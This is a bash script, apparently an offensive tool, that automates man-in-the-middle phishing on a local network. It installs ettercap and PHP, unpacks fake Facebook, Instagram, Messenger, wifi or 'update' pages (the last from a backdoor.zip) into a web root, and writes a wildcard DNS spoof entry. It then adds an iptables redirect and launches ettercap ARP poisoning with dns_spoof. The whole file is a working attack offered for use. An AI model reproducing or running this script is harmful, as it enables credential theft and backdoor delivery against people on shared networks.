#!/bin/bash

#COLOURS
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
purple="\033[0;35m"
cyan="\033[0;36m"
cafe="\033[0;33m"
fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
y="Y"
n="n"
e="ENTER"

echo -e "$green"

cat << "EOF" 
           _ _  ___  ___  _    _      _             
          | | |/ __>| . \| |_ <_> ___| |_  ___  _ _ 
          |   |\__ \|  _/| . || |<_-<| . |/ ._>| '_>
          |_|_|<___/|_|  |_|_||_|/__/|_|_|\___.|_|  
EOF
echo -e "$nc"
echo -e  "                 $yellow-+-$white Coded by:$red @HxRofo $yellow-+-\n $nc"
sleep 5;

# PACKAGES
echo -e  "$red[$green*$red]$white Installing Required Packages ... $nc"
apt update;
apt install php -y;
apt install ettercap-text-only -y;
apt install unzip -y; 
sleep 2;
clear

#ATTACK SCENARIOS

echo -e  "$red[$yellow*$red]$yellow Choose a Scenario: \n $nc"
function main()
{
    while :
    do

        echo -e "$red[$green"1"$red]$green Fake Facebook                                     \n"
        echo -e "$red[$green"2"$red]$green Fake Update                 \n"
        echo -e "$red[$green"3"$red]$green Fake Wifi                 \n"
        echo -e "$red[$green"4"$red]$green Fake Instagram                 \n"
        echo -e "$red[$green"5"$red]$green Fake Messenger                                     \n"
        echo -e "$red[$green"6"$red]$green Exit                 \n"
        read -p " Select>: " option
        echo 
        
        case "$option" in 
		1)  echo -e $green "[✔] Fake Facebook"
echo
echo -e  "$red[$green*$red]$white Moving Facebook Files to /var/www/html/ ... $nc" ;
unzip -o facebook.zip -d /var/www/html/ ;
sleep 2;
echo -e  "$red[$green*$red]$green Editing etter.dns ... $nc"
echo "* A $IP" > /etc/ettercap/etter.dns ;
echo -e  "$red[$green*$red]$green Done $nc" 
clear && sleep 2;
echo -e  "$red[$green*$red]$green Starting iptables $nc"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 ;
clear && sleep 2;
echo -e  "$red[$green*$red]$green Starting ettercap $nc"
ettercap -Tqi wlan0 -M arp:remote -P dns_spoof /// ;;

		2)  echo -e $green "[✔] Fake Update"
                
echo -e  "$red[$green*$red]$white Moving Backdoor Files to /var/www/html/ ... $nc"                
unzip -o backdoor.zip -d /var/www/html/
sleep 2
echo -e  "$red[$green*$red]$green Editing etter.dns ... $nc"
echo "* A $IP" > /etc/ettercap/etter.dns ;
echo -e  "$red[$green*$red]$green Done $nc" 
clear && sleep 2;
echo -e  "$red[$green*$red]$green Starting iptables $nc"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 ;
clear && sleep 2;
echo -e  "$red[$green*$red]$green Starting ettercap $nc"
ettercap -Tqi wlan0 -M arp:remote -P dns_spoof /// ;;

		3)  echo -e $green "[✔] Fake Wifi"
echo
echo -e  "$red[$green*$red]$white Moving Wifi Files to /var/www/html/ ... $nc" ;
unzip -o wifi.zip -d /var/www/html/ ;
sleep 2;
echo -e  "$red[$green*$red]$green Editing etter.dns ... $nc"
echo "* A $IP" > /etc/ettercap/etter.dns ;
echo -e  "$red[$green*$red]$green Done $nc" 
clear && sleep 2;
echo -e  "$red[$green*$red]$green Starting iptables $nc"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 ;
clear && sleep 2;
echo -e  "$red[$green*$red]$green Starting ettercap $nc"
ettercap -Tqi wlan0 -M arp:remote -P dns_spoof /// ;;

		4)  echo -e $green "[✔] Fake Instagram"
echo
echo -e  "$red[$green*$red]$white Moving Instagram Files to /var/www/html/ ... $nc" ;
unzip -o instagram.zip -d /var/www/html/ ;
sleep 2;
echo -e  "$red[$green*$red]$green Editing etter.dns ... $nc"
echo "* A $IP" > /etc/ettercap/etter.dns ;
echo -e  "$red[$green*$red]$green Done $nc" 
clear && sleep 2;
echo -e  "$red[$green*$red]$green Starting iptables $nc"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 ;
clear && sleep 2;
echo -e  "$red[$green*$red]$green Starting ettercap $nc"
ettercap -Tqi wlan0 -M arp:remote -P dns_spoof /// ;;

		5)  echo -e $green "[✔] Fake Messenger"
echo
echo -e  "$red[$green*$red]$white Moving Messenger Files to /var/www/html/ ... $nc" ;
unzip -o messenger.zip -d /var/www/html/ ;
sleep 2;
echo -e  "$red[$green*$red]$green Editing etter.dns ... $nc"
echo "* A $IP" > /etc/ettercap/etter.dns ;
echo -e  "$red[$green*$red]$green Done $nc" 
clear && sleep 2;
echo -e  "$red[$green*$red]$green Starting iptables $nc"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 ;
clear && sleep 2;
echo -e  "$red[$green*$red]$green Starting ettercap $nc"
ettercap -Tqi wlan0 -M arp:remote -P dns_spoof /// ;;

		6)  echo -e $yellow " Exiting Script. Good Bye !!"
sleep 3;
exit 
;;

        esac 
    done
}
main
